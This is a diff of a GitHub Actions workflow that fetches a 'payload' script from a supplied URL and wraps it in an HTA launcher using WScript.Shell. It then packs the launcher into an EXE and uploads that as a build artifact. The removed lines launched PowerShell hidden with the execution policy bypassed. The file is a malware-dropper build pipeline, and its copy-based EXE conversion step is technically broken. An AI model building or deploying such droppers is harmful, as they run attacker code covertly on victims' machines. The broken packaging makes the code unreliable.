@@ -1,10 +1,10 @@
-name: Build JScript PowerShell EXE
+name: Convert JScript to EXE
 
 on:
   workflow_dispatch:
     inputs:
       payload_url:
-        description: 'URL to fetch payload'
+        description: 'URL to fetch payload.js'
         required: true
         type: string
 
@@ -13,34 +13,38 @@ jobs:
     runs-on: windows-latest
 
     steps:
+    # Step 1: Checkout repository
     - name: Checkout code
       uses: actions/checkout@v3
 
-    - name: Fetch Payload Script
+    # Step 2: Fetch the JScript payload
+    - name: Fetch JScript Payload
       shell: powershell
       run: |
-        $url = '${{ github.event.inputs.payload_url }}'
-        Invoke-WebRequest -Uri $url -OutFile 'payload.ps1'
+        Invoke-WebRequest -Uri '${{ github.event.inputs.payload_url }}' -OutFile 'payload.js'
+        if (!(Test-Path "payload.js")) { Write-Host "Payload script missing!"; exit 1 }
 
-    - name: Create JScript Wrapper
+    # Step 3: Create an EXE Wrapper using mshta
+    - name: Create HTA Wrapper
       shell: powershell
       run: |
-        @'
+        Set-Content -Path "payload.hta" -Value @"
+        <script language="JScript">
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
         var shell = new ActiveXObject("WScript.Shell");
-        shell.Run("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File payload.ps1", 0, true);
-        '@ | Set-Content payload.js
+        shell.Run("cscript.exe //nologo payload.js");
+        </script>
+        "@
 
-    - name: Convert JScript to EXE
-      shell: powershell
+    # Step 4: Convert HTA to EXE using Native SFX
+    - name: Convert HTA to EXE
+      shell: cmd
       run: |
-        iex "cscript.exe payload.js"
+        copy /b %SystemRoot%\system32\iexpress.exe + payload.hta payload.exe
 
+    # Step 5: Upload the generated EXE
     - name: Upload Executable
       uses: actions/upload-artifact@v4
       with:
-        name: payload_js
-        path: payload.js
-
-
-
-
+        name: payload_exe
+        path: payload.exe
